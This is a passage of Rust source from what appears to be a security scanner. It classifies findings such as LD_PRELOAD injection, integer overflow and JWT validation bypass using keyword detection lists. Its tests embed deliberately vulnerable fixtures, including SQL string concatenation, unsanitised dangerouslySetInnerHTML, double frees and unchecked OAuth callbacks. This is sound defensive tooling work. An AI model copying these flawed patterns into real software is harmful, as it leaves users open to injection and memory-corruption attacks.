pub fn classify_bounded_overflow_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let path = finding.file.as_deref().unwrap_or_default();
    let path_lower = path.to_ascii_lowercase();
    let in_test_path = path_lower.contains("test")
        || path_lower.contains("spec/")
        || path_lower.contains("bench")
        || path_lower.contains("fixture");
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }

    let lower = source.to_ascii_lowercase();
    let overflow_check_tokens = [
        "__builtin_add_overflow",
        "__builtin_mul_overflow",
        "safe_add",
        "checked_add",
        "int_max - ",
        "int_max-",
        "std::numeric_limits",
        "assert(n <",
        "assert(n<=",
        "assert(size <",
        "overflow_check",
        "if (n > max",
        "if (size > max",
    ];
    let has_overflow_check = overflow_check_tokens.iter().any(|t| lower.contains(t));
    if has_overflow_check {
        return ProofClass::InvariantViolationProof;
    }

    let user_bound_tokens = [
        "argc",
        "argv",
        "request.",
        "user_input",
        "atoi(",
        "strtol(",
        "getenv(",
        "scanf(",
        "fgets(",
        "cin >>",
        "argv[",
    ];
    let has_user_controlled_bound = user_bound_tokens.iter().any(|t| lower.contains(t));

    let sink_tokens = [
        "malloc(n",
        "malloc(size",
        "new t[n",
        "new char[",
        "memcpy(",
        "memmove(",
        "vec.reserve(",
        "vec.resize(",
        "for (",
        "while (n",
    ];
    let has_overflow_sink = sink_tokens.iter().any(|t| lower.contains(t));

    if bounded_overflow_is_exploitable(has_user_controlled_bound && has_overflow_sink, false, false)
    {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of LD_PRELOAD injection exploitability.
///
/// Returns `true` when a user-controlled string reaches `LD_PRELOAD=` assignment
/// without a scope guard, outside of a test file.
pub fn ld_preload_injection_is_exploitable(
    has_user_input: bool,
    has_env_set: bool,
    has_scope_guard: bool,
    in_test_path: bool,
) -> bool {
    has_user_input && has_env_set && !has_scope_guard && !in_test_path
}

/// Classify proof class for `security:ld_preload_injection` findings.
///
/// - `InvariantViolationProof`: test path OR scope guard visible in source
/// - `ReachabilityProof`: user-controlled string reaches `LD_PRELOAD=` without guard
/// - `LatticeGapProposal`: LD_PRELOAD set but input origin is unclear
pub fn classify_ld_preload_injection_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path = finding.file.as_deref().unwrap_or_default();
    let path_lower = path.to_ascii_lowercase();
    let in_test_path = path_lower.contains("test")
        || path_lower.contains("spec/")
        || path_lower.contains("fixture");
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }

    let lower = source.to_ascii_lowercase();
    let scope_guard_tokens = [
        "unsetenv(\"ld_preload\")",
        "unsetenv('ld_preload')",
        "env -i",
        "sudo -e",
        "# hardcoded",
        "# no user input",
        "# static",
    ];
    let has_scope_guard = scope_guard_tokens.iter().any(|t| lower.contains(t));
    if has_scope_guard {
        return ProofClass::InvariantViolationProof;
    }

    let env_set_tokens = [
        "ld_preload=",
        "export ld_preload",
        "setenv(\"ld_preload\"",
        "putenv(\"ld_preload",
    ];
    let has_env_set = env_set_tokens.iter().any(|t| lower.contains(t));

    let user_input_tokens = [
        "$1",
        "$user_input",
        "$@",
        "request.",
        "argv[",
        "${1}",
        "getenv(",
        "read ",
        "read\t",
    ];
    let has_user_input = user_input_tokens.iter().any(|t| lower.contains(t));

    if ld_preload_injection_is_exploitable(has_user_input, has_env_set, false, false) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of JWT keyfunc proof logic.
///
/// | `in_test_path` | `has_valid_methods_guard` | `has_nil_nil_return` | returns                   |
/// |---|---|---|---|
/// | `true`  | any   | any   | `InvariantViolationProof` |
/// | `false` | `true`| any   | `InvariantViolationProof` |
/// | `false` | `false`| `true` | `ReachabilityProof`      |
/// | `false` | `false`| `false`| `LatticeGapProposal`    |
pub fn classify_jwt_keyfunc_proof(
    has_valid_methods_guard: bool,
    has_nil_nil_return: bool,
    in_test_path: bool,
) -> ProofClass {
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }
    if has_valid_methods_guard {
        return ProofClass::InvariantViolationProof;
    }
    if has_nil_nil_return {
        return ProofClass::ReachabilityProof;
    }
    ProofClass::LatticeGapProposal
}

/// Classify the proof state for a `security:jwt_validation_bypass` finding.
///
/// Reads source to detect algorithm-restriction guards (`WithValidMethods`,
/// `token.Method.Alg()`, type assertions on `token.Method`) and nil/nil
/// keyfunc returns. Delegates classification to [`classify_jwt_keyfunc_proof`].
pub fn classify_jwt_validation_bypass_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.ends_with("_test.go")
                || p.contains("spec")
                || p.ends_with("_test.rs")
        })
        .unwrap_or(false);
    let has_valid_methods_guard = source.contains("WithValidMethods(")
        || source.contains("token.Method.Alg()")
        || source.contains("token.Method.(*")
        || source.contains("*jwt.SigningMethod")
        || source.contains("*SigningMethod");
    let has_nil_nil_return = source.contains("return nil, nil");
    classify_jwt_keyfunc_proof(has_valid_methods_guard, has_nil_nil_return, in_test_path)
}

#[cfg(test)]
mod tests {
    use super::{
        append_gap_proposals_to, enforce_false_positive_proof_obligation, proof_obligation_missing,
    };
    use common::slop::{ExploitWitness, ProofClass, StructuredFinding};
    use tempfile::NamedTempFile;

    #[test]
    fn suppresses_critical_finding_without_proof_class() {
        let findings = vec![StructuredFinding {
            id: "security:ssrf_dynamic_url".to_string(),
            severity: Some("Critical".to_string()),
            ..Default::default()
        }];

        let filtered = enforce_false_positive_proof_obligation(&findings);
        assert!(filtered.is_empty());
    }

    #[test]
    fn preserves_critical_finding_with_proof_class() {
        let findings = vec![StructuredFinding {
            id: "security:ssrf_dynamic_url".to_string(),
            severity: Some("Critical".to_string()),
            proof_class: Some(ProofClass::ReachabilityProof),
            ..Default::default()
        }];

        let filtered = enforce_false_positive_proof_obligation(&findings);
        assert_eq!(filtered.len(), 1);
    }

    #[test]
    fn upgrades_implicit_exploit_witness_to_reachability_proof() {
        let findings = vec![StructuredFinding {
            id: "security:ssrf_dynamic_url".to_string(),
            severity: Some("Critical".to_string()),
            exploit_witness: Some(ExploitWitness::default()),
            ..Default::default()
        }];

        let filtered = enforce_false_positive_proof_obligation(&findings);
        assert_eq!(filtered[0].proof_class, Some(ProofClass::ReachabilityProof));
    }

    #[test]
    fn upgrades_self_proving_credential_finding_to_invariant_proof() {
        let findings = vec![StructuredFinding {
            id: "security:credential_exposure".to_string(),
            severity: Some("Critical".to_string()),
            ..Default::default()
        }];

        let filtered = enforce_false_positive_proof_obligation(&findings);
        assert_eq!(
            filtered[0].proof_class,
            Some(ProofClass::InvariantViolationProof)
        );
    }

    #[test]
    fn appends_gap_once_per_heading() {
        let file = NamedTempFile::new().unwrap();
        std::fs::write(file.path(), "# Log\n").unwrap();
        let proposal =
            "\n### P17-3A — Proof Obligation Cure for security:test\n\nbody\n".to_string();

        append_gap_proposals_to(file.path(), &[proposal.clone()]).unwrap();
        append_gap_proposals_to(file.path(), &[proposal]).unwrap();

        let content = std::fs::read_to_string(file.path()).unwrap();
        assert_eq!(
            content
                .matches("### P17-3A — Proof Obligation Cure for security:test")
                .count(),
            1
        );
    }

    #[test]
    fn helper_tracks_missing_requirement() {
        assert!(proof_obligation_missing(true, false));
        assert!(!proof_obligation_missing(true, true));
        assert!(!proof_obligation_missing(false, false));
    }

    #[test]
    fn preserves_kev_critical_finding_with_lattice_gap_proof_class() {
        // Regression: lcm.rs and agent_intent.rs emit LatticeGapProposal.
        // Verify the gate passes them through rather than suppressing.
        let findings = vec![StructuredFinding {
            id: "security:ffi_unsafe_deref_unguarded".to_string(),
            severity: Some("KevCritical".to_string()),
            proof_class: Some(ProofClass::LatticeGapProposal),
            ..Default::default()
        }];

        let filtered = enforce_false_positive_proof_obligation(&findings);
        assert_eq!(filtered.len(), 1);
        assert_eq!(
            filtered[0].proof_class,
            Some(ProofClass::LatticeGapProposal)
        );
    }

    #[test]
    fn suppresses_kev_critical_finding_without_any_proof_class() {
        let findings = vec![StructuredFinding {
            id: "security:unknown_rule_with_no_synthesizer".to_string(),
            severity: Some("KevCritical".to_string()),
            ..Default::default()
        }];

        let filtered = enforce_false_positive_proof_obligation(&findings);
        assert!(filtered.is_empty());
    }

    #[test]
    fn ffi_unsafe_deref_unguarded_kev_critical_gets_lattice_gap_proposal() {
        let findings = vec![StructuredFinding {
            id: "security:ffi_unsafe_deref_unguarded".to_string(),
            severity: Some("KevCritical".to_string()),
            ..Default::default()
        }];

        let filtered = enforce_false_positive_proof_obligation(&findings);
        assert_eq!(filtered.len(), 1);
        assert_eq!(
            filtered[0].proof_class,
            Some(ProofClass::LatticeGapProposal)
        );
    }

    #[test]
    fn intent_divergence_non_test_path_yields_reachability_proof() {
        let finding = StructuredFinding {
            id: "security:intent_divergence".to_string(),
            file: Some("codex-rs/model-provider/src/auth.rs".to_string()),
            ..Default::default()
        };
        let source =
            "pub struct UnauthenticatedAuthProvider; fn build() { requires_openai_auth: false }";
        assert_eq!(
            super::classify_intent_divergence_proof(&finding, source),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn intent_divergence_test_path_yields_lattice_gap() {
        let finding = StructuredFinding {
            id: "security:intent_divergence".to_string(),
            file: Some("codex-rs/model-provider/src/auth_test.rs".to_string()),
            ..Default::default()
        };
        let source = "pub struct UnauthenticatedAuthProvider;";
        assert_eq!(
            super::classify_intent_divergence_proof(&finding, source),
            ProofClass::LatticeGapProposal
        );
    }

    #[test]
    fn ffi_deref_null_guard_present_yields_invariant_violation_proof() {
        let source =
            "let ptr = qdb_read(key);\nif ptr.is_null() { return Err(e); }\nCStr::from_ptr(ptr)";
        assert_eq!(
            super::classify_ffi_deref_proof(source, 3),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn ffi_deref_unguarded_no_extern_yields_lattice_gap() {
        let source = "let ptr = qdb_read(key);\nlet value = CStr::from_ptr(ptr);\n";
        assert_eq!(
            super::classify_ffi_deref_proof(source, 2),
            ProofClass::LatticeGapProposal
        );
    }

    #[test]
    fn ffi_deref_unguarded_with_extern_c_yields_reachability_proof() {
        let source = "extern \"C\" pub fn get_config(key: *const c_char) -> *const c_char {\nlet ptr = qdb_read(key);\nCStr::from_ptr(ptr)\n}";
        assert_eq!(
            super::classify_ffi_deref_proof(source, 3),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn raw_pointer_deref_no_null_guard_yields_lattice_gap() {
        // Matches the ClickHouse PRQL FFI surface: *raw_ptr at line 9 with no .is_null() guard.
        let source = "use prql_compiler::compile;\npub fn compile_prql(prql: *const u8, len: usize) -> *mut u8 {\n    let slice = unsafe { std::slice::from_raw_parts(*raw_ptr, len) };\n    let result = compile(std::str::from_utf8(slice).unwrap());\n    let s = result.unwrap_or_default();\n    let boxed = s.into_boxed_str().into_boxed_bytes();\n    Box::into_raw(boxed) as *mut u8\n}\n";
        assert_eq!(
            super::classify_ffi_deref_proof(source, 3),
            ProofClass::LatticeGapProposal
        );
    }

    // --- lcm_double_free classifier tests ---

    #[test]
    fn lcm_double_free_null_guard_yields_invariant_violation() {
        let source =
            "int *buf = malloc(sz);\nif (buf != NULL) {\n    free(buf);\n    free(buf);\n}";
        assert_eq!(
            super::classify_lcm_double_free_proof(source, 3),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn lcm_double_free_secp256k1_api_yields_reachability_proof() {
        let source =
            "SECP256K1_API int secp256k1_sign(secp256k1_context *ctx, unsigned char *out) {\n    free(ctx->scratch);\n    free(ctx->scratch);\n    return 1;\n}";
        assert_eq!(
            super::classify_lcm_double_free_proof(source, 2),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn lcm_double_free_no_guard_no_extern_yields_lattice_gap() {
        let source = "void process(unsigned char *buf, size_t len) {\n    memcpy(tmp, buf, len);\n    free(buf);\n    free(buf);\n}";
        assert_eq!(
            super::classify_lcm_double_free_proof(source, 3),
            ProofClass::LatticeGapProposal
        );
    }

    // --- timing_comparison classifier tests ---

    #[test]
    fn timing_comparison_subtle_constant_time_guard_suppresses() {
        let finding = StructuredFinding {
            id: "security:non_constant_time_comparison".to_string(),
            file: Some("crypto/ecies/ecies.go".to_string()),
            line: Some(319),
            ..Default::default()
        };
        let source = "func Decrypt(prv *PrivateKey, c []byte) (m []byte, err error) {\n\
            Ke, Km := deriveKeys(hash, z, s1, params.KeyLen)\n\
            d := messageTag(params.Hash, Km, c[mStart:mEnd], s2)\n\
            if subtle.ConstantTimeCompare(c[mEnd:], d) != 1 {\n\
                return nil, ErrInvalidMessage\n\
            }\n\
            return symDecrypt(params, Ke, c[mStart:mEnd])\n\
            }";
        assert_eq!(
            super::classify_timing_comparison_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn timing_comparison_hmac_non_test_yields_reachability_proof() {
        let finding = StructuredFinding {
            id: "security:non_constant_time_comparison".to_string(),
            file: Some("p2p/discover/v5wire/encoding.go".to_string()),
            ..Default::default()
        };
        let source = "func verifySession(got, expected []byte) bool {\n    nonce := session.nonce\n    return bytes.Equal(got, expected)\n}";
        assert_eq!(
            super::classify_timing_comparison_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn timing_comparison_test_path_yields_lattice_gap() {
        let finding = StructuredFinding {
            id: "security:non_constant_time_comparison".to_string(),
            file: Some("p2p/discover/v5wire/encoding_test.go".to_string()),
            ..Default::default()
        };
        let source = "func TestVerifySession(t *testing.T) {\n    nonce := session.nonce\n    return bytes.Equal(got, expected)\n}";
        assert_eq!(
            super::classify_timing_comparison_proof(source, &finding),
            ProofClass::LatticeGapProposal
        );
    }

    #[test]
    fn timing_comparison_java_argon2_yields_reachability_proof() {
        let finding = StructuredFinding {
            id: "security:non_constant_time_comparison".to_string(),
            file: Some(
                "crypto/default/src/main/java/org/keycloak/crypto/hash/Argon2PasswordHashProvider.java"
                    .to_string(),
            ),
            line: Some(102),
            ..Default::default()
        };
        let source = "public boolean verify(String rawPassword, PasswordCredentialModel credential) {\n\
            String encoded = encode(rawPassword, secretData.getSalt(), version, type, hashLength, parallelism, memory, iterations);\n\
            return encoded.equals(secretData.getValue());\n\
            }";
        assert_eq!(
            super::classify_timing_comparison_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn timing_comparison_java_test_class_yields_lattice_gap() {
        let finding = StructuredFinding {
            id: "security:non_constant_time_comparison".to_string(),
            file: Some(
                "crypto/default/src/test/java/org/keycloak/crypto/hash/Argon2PasswordHashProviderTest.java"
                    .to_string(),
            ),
            line: Some(55),
            ..Default::default()
        };
        let source = "void testVerify_rawPassword() { return encoded.equals(stored); }";
        assert_eq!(
            super::classify_timing_comparison_proof(source, &finding),
            ProofClass::LatticeGapProposal
        );
    }

    #[test]
    fn timing_comparison_check_password_hash_suppresses() {
        let finding = StructuredFinding {
            id: "security:non_constant_time_comparison".to_string(),
            file: Some("querybook/server/models/user.py".to_string()),
            line: Some(55),
            ..Default::default()
        };
        let source = "@password.setter\ndef password(self, plaintext):\n    if plaintext is not None:\n        self._password = generate_password_hash(plaintext)\n    else:\n        self._password = None\n\ndef check_password(self, plaintext):\n    return check_password_hash(self._password or \"\", plaintext)\n";
        assert_eq!(
            super::classify_timing_comparison_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    // --- lcm_use_after_free classifier tests ---

    #[test]
    fn lcm_use_after_free_null_guard_yields_invariant_violation() {
        let source = "void secp256k1_context_destroy(secp256k1_context *ctx) {\n    if (ctx != NULL) {\n        secp256k1_scalar_clear(&ctx->blind);\n        free(ctx);\n    }\n    ctx->extra_entropy = NULL;\n}";
        assert_eq!(
            super::classify_lcm_use_after_free_proof(source, 6),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn lcm_use_after_free_secp256k1_api_yields_reachability() {
        let source = "SECP256K1_API int secp256k1_ecdsa_verify(\n    const secp256k1_context *ctx,\n    const secp256k1_ecdsa_signature *sig,\n    const unsigned char *msghash32,\n    const secp256k1_pubkey *pubkey\n) {\n    free(ctx->scratch);\n    return ctx->scratch->data;\n}";
        assert_eq!(
            super::classify_lcm_use_after_free_proof(source, 7),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn lcm_use_after_free_no_context_yields_lattice_gap() {
        let source = "void process(unsigned char *buf, size_t len) {\n    free(buf);\n    memcpy(dst, buf, len);\n}";
        assert_eq!(
            super::classify_lcm_use_after_free_proof(source, 3),
            ProofClass::LatticeGapProposal
        );
    }

    // --- lcm_off_by_one_loop classifier tests ---

    #[test]
    fn lcm_off_by_one_loop_assert_guard_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:lcm_off_by_one_loop".to_string(),
            file: Some("trezor-crypto/crypto/aes/aes_modes.c".to_string()),
            line: Some(5),
            ..Default::default()
        };
        let source = "static void cbc_encrypt(const uint8_t *in, uint8_t *out, size_t len) {\n    size_t b_pos = 0;\n    assert(b_pos == 0);\n    while (b_pos < len) {\n        b_pos += AES_BLOCK_SIZE;\n    }\n}";
        assert_eq!(
            super::classify_lcm_off_by_one_loop_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn lcm_off_by_one_loop_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:lcm_off_by_one_loop".to_string(),
            file: Some("crypto/secp256k1/libsecp256k1/src/tests.c".to_string()),
            line: Some(2156),
            ..Default::default()
        };
        let source = "void test_loop(void) { for (int i = 0; i <= len; i++) {} }";
        assert_eq!(
            super::classify_lcm_off_by_one_loop_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn lcm_off_by_one_loop_production_c_no_guard_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:lcm_off_by_one_loop".to_string(),
            file: Some("trezor-crypto/crypto/pbkdf2.c".to_string()),
            line: Some(5),
            ..Default::default()
        };
        let source = "void pbkdf2_hmac_sha256(const uint8_t *pass, int passlen,\n    const uint8_t *salt, int saltlen,\n    uint32_t iterations, uint8_t *key, int keylen) {\n    uint32_t f[SHA256_DIGEST_LENGTH / 4];\n    for (int i = 0; i <= keylen; i++) {\n        f[i] ^= g[i];\n    }\n}";
        assert_eq!(
            super::classify_lcm_off_by_one_loop_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    // --- oauth_state_validation classifier tests ---

    #[test]
    fn oauth_state_server_side_python_no_check_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:oauth_missing_state_validation".to_string(),
            file: Some("querybook/server/app/auth/oauth_auth.py".to_string()),
            line: Some(80),
            ..Default::default()
        };
        let source =
            "def callback():\n    code = request.args.get('code')\n    _fetch_access_token(code)\n";
        assert_eq!(
            super::classify_oauth_state_validation_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn oauth_state_server_side_python_with_check_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:oauth_missing_state_validation".to_string(),
            file: Some("server/app/auth/oauth_auth.py".to_string()),
            line: Some(55),
            ..Default::default()
        };
        let source = "def callback():\n    state = session.get('oauth_state')\n    code = request.args.get('code')\n    if state == request.args.get('state'):\n        _fetch_access_token(code)\n";
        assert_eq!(
            super::classify_oauth_state_validation_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn oauth_state_client_side_typescript_yields_lattice_gap() {
        let finding = StructuredFinding {
            id: "security:oauth_missing_state_validation".to_string(),
            file: Some("lib/oidc/callback.ts".to_string()),
            line: Some(34),
            ..Default::default()
        };
        let source = "export async function exchangeCode(code: string) { return fetch('/token', { body: JSON.stringify({ code }) }); }";
        assert_eq!(
            super::classify_oauth_state_validation_proof(source, &finding),
            ProofClass::LatticeGapProposal
        );
    }

    #[test]
    fn oauth_state_hydra_fosite_token_handler_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:oauth_missing_state_validation".to_string(),
            file: Some("fosite/handler/oauth2/token_handler.go".to_string()),
            line: Some(42),
            ..Default::default()
        };
        let source = "func HandleToken(r *http.Request) {\n    grant := r.FormValue(\"grant_type\")\n    code := r.FormValue(\"code\")\n    _ = grant\n    _ = code\n}";
        assert_eq!(
            super::classify_oauth_state_validation_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn oauth_state_supertokens_oauth_token_api_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:oauth_missing_state_validation".to_string(),
            file: Some(
                "src/main/java/io/supertokens/webserver/api/oauth/OAuthTokenAPI.java".to_string(),
            ),
            line: Some(77),
            ..Default::default()
        };
        let source = "class OAuthTokenAPI { void handle(Request request) { String code = request.getParameter(\"code\"); } }";
        assert_eq!(
            super::classify_oauth_state_validation_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn oauth_state_authentik_generated_migration_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:oauth_missing_state_validation".to_string(),
            file: Some("authentik/providers/oauth2/migrations/0001_generated.py".to_string()),
            line: Some(12),
            ..Default::default()
        };
        let source = "class Migration(migrations.Migration):\n    field = models.CharField(default='authorization_code')\n";
        assert_eq!(
            super::classify_oauth_state_validation_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn oauth_state_keycloak_java_spi_interface_yields_lattice_gap() {
        // Regression: Keycloak OAuth2Constants.java and Authenticator.java are
        // constants/SPI interface files — not HTTP callback handlers. Without the
        // Java HTTP-handler gate these produced false-positive ReachabilityProof.
        let finding = StructuredFinding {
            id: "security:oauth_missing_state_validation".to_string(),
            file: Some("core/src/main/java/org/keycloak/OAuth2Constants.java".to_string()),
            line: None,
            ..Default::default()
        };
        let source = "public class OAuth2Constants {\n    public static final String CODE = \"code\";\n    public static final String STATE = \"state\";\n}\n";
        assert_eq!(
            super::classify_oauth_state_validation_proof(source, &finding),
            ProofClass::LatticeGapProposal
        );
    }

    #[test]
    fn oauth_state_java_http_handler_with_annotation_yields_reachability() {
        // Java controller with @GetMapping + getParameter("code") IS a callback handler
        // with explicit code extraction → ReachabilityProof.
        let finding = StructuredFinding {
            id: "security:oauth_missing_state_validation".to_string(),
            file: Some("src/main/java/com/example/OAuthCallbackController.java".to_string()),
            line: Some(42),
            ..Default::default()
        };
        let source = "@GetMapping(\"/callback\")\npublic ResponseEntity<?> callback(HttpServletRequest req) {\n    String code = req.getParameter(\"code\");\n    String token = exchangeCode(code);\n    return ResponseEntity.ok(token);\n}\n";
        assert_eq!(
            super::classify_oauth_state_validation_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    // --- lcm_malloc_integer_truncation classifier tests ---

    #[test]
    fn lcm_malloc_trunc_bench_path_suppressed() {
        let finding = StructuredFinding {
            id: "security:lcm_malloc_integer_truncation".to_string(),
            file: Some("crypto/secp256k1/libsecp256k1/src/bench_ecmult.c".to_string()),
            line: Some(42),
            ..Default::default()
        };
        let source = "void *scratch = malloc(n * sizeof(secp256k1_gej));\n";
        assert_eq!(
            super::classify_lcm_malloc_integer_truncation_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn lcm_malloc_trunc_secp256k1_api_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:lcm_malloc_integer_truncation".to_string(),
            file: Some("crypto/secp256k1/libsecp256k1/src/secp256k1.c".to_string()),
            line: Some(3),
            ..Default::default()
        };
        let source = "SECP256K1_API secp256k1_scratch_space *secp256k1_scratch_create(\n    const secp256k1_context *ctx,\n    size_t size\n) {\n    void *buf = malloc(size * 2);\n    return buf;\n}";
        assert_eq!(
            super::classify_lcm_malloc_integer_truncation_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn lcm_malloc_trunc_no_context_yields_lattice_gap() {
        let finding = StructuredFinding {
            id: "security:lcm_malloc_integer_truncation".to_string(),
            file: Some("utils/alloc.c".to_string()),
            line: Some(2),
            ..Default::default()
        };
        let source = "void *alloc_buf(size_t n, size_t m) {\n    return malloc(n * m);\n}";
        assert_eq!(
            super::classify_lcm_malloc_integer_truncation_proof(source, &finding),
            ProofClass::LatticeGapProposal
        );
    }

    // --- oauth_account_fusion classifier tests ---

    #[test]
    fn oauth_account_fusion_typescript_sdk_yields_lattice_gap() {
        let finding = StructuredFinding {
            id: "security:oauth_account_fusion_pretakeover".to_string(),
            file: Some("src/resources/AccountLinks.ts".to_string()),
            ..Default::default()
        };
        let source = "export const AccountLinks = StripeResource.extend({ create: stripeMethod({ method: 'POST', fullPath: '/v1/account_links' }) });";
        assert_eq!(
            super::classify_oauth_account_fusion_proof(source, &finding),
            ProofClass::LatticeGapProposal
        );
    }

    #[test]
    fn oauth_account_fusion_python_no_check_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:oauth_account_fusion_pretakeover".to_string(),
            file: Some("server/app/auth/oauth_auth.py".to_string()),
            ..Default::default()
        };
        let source = "def oauth_callback():\n    code = request.args.get('code')\n    token = _fetch_access_token(code)\n    user = get_or_create_user(token)\n    login_user(user)\n";
        assert_eq!(
            super::classify_oauth_account_fusion_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn oauth_account_fusion_python_with_check_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:oauth_account_fusion_pretakeover".to_string(),
            file: Some("server/app/auth/oauth_auth.py".to_string()),
            ..Default::default()
        };
        let source = "def oauth_callback():\n    code = request.args.get('code')\n    token = _fetch_access_token(code)\n    if not token.get('email_verified'):\n        abort(403)\n    user = get_or_create_user(token)\n    login_user(user)\n";
        assert_eq!(
            super::classify_oauth_account_fusion_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    // --- protobuf_any classifier tests ---

    #[test]
    fn protobuf_any_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:protobuf_any_unguarded_decode".to_string(),
            file: Some("vault/identity/mock/store_test.go".to_string()),
            ..Default::default()
        };
        let source = "ptypes.UnmarshalAny(entity.Metadata, &meta)";
        assert_eq!(
            super::classify_protobuf_any_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn protobuf_any_deprecated_api_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:protobuf_any_unguarded_decode".to_string(),
            file: Some("vault/identity_store.go".to_string()),
            ..Default::default()
        };
        let source =
            "if err := ptypes.UnmarshalAny(entity.Metadata, &meta); err != nil { return err }";
        assert_eq!(
            super::classify_protobuf_any_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn protobuf_any_modern_with_type_check_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:protobuf_any_unguarded_decode".to_string(),
            file: Some("api/types/role.go".to_string()),
            ..Default::default()
        };
        let source = "if msg.TypeUrl != allowedTypeURL { return ErrInvalidType }\nanypb.UnmarshalTo(msg, proto.MessageV2(out), proto.UnmarshalOptions{})";
        assert_eq!(
            super::classify_protobuf_any_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn sqli_concat_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            file: Some("store/store_test.go".to_string()),
            ..Default::default()
        };
        let source = r#"query := "SELECT * FROM users WHERE id=" + userId"#;
        assert_eq!(
            super::classify_sqli_concatenation_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn sqli_concat_raw_concat_go_yields_reachability() {
        let finding = StructuredFinding {
            file: Some("core/store/store.go".to_string()),
            ..Default::default()
        };
        let source = r#"q := fmt.Sprintf("SELECT * FROM users WHERE name='%s'", userName)"#;
        assert_eq!(
            super::classify_sqli_concatenation_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn sqli_concat_parameterized_yields_invariant_violation() {
        let finding = StructuredFinding {
            file: Some("core/store/store.go".to_string()),
            ..Default::default()
        };
        let source = r#"rows, err := db.Prepare("SELECT * FROM users WHERE id = $1")"#;
        assert_eq!(
            super::classify_sqli_concatenation_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn react_xss_test_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:react_xss_dangerous_html".to_string(),
            file: Some("webapp/channels/src/components/__tests__/latex_block.test.tsx".to_string()),
            ..Default::default()
        };
        let source = "el.dangerouslySetInnerHTML({ __html: props.content })";
        assert_eq!(
            super::classify_react_xss_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn react_xss_dompurify_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:react_xss_dangerous_html".to_string(),
            file: Some("webapp/channels/src/components/latex_block/latex_block.tsx".to_string()),
            ..Default::default()
        };
        let source = "const safe = DOMPurify.sanitize(props.content);\nel.dangerouslySetInnerHTML({ __html: safe })";
        assert_eq!(
            super::classify_react_xss_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
    fn react_xss_unguarded_prop_yields_reachability() {
        let finding = StructuredFinding {
            id: "security:react_xss_dangerous_html".to_string(),
            file: Some("webapp/channels/src/components/post/post_body.tsx".to_string()),
            ..Default::default()
        };
        let source = "return <div dangerouslySetInnerHTML={{ __html: props.content }} />;";
        assert_eq!(
            super::classify_react_xss_proof(source, &finding),
            ProofClass::ReachabilityProof
        );
    }

    #[test]
    fn debug_endpoint_dev_server_path_yields_invariant_violation() {
        let finding = StructuredFinding {
            id: "security:unauthenticated_debug_endpoint".to_string(),
            file: Some("apps/login/scripts/server.mjs".to_string()),
            ..Default::default()
        };
        let source = "app.get('/debug/vars', handler);";
        assert_eq!(
            super::classify_debug_endpoint_proof(source, &finding),
            ProofClass::InvariantViolationProof
        );
    }

    #[test]
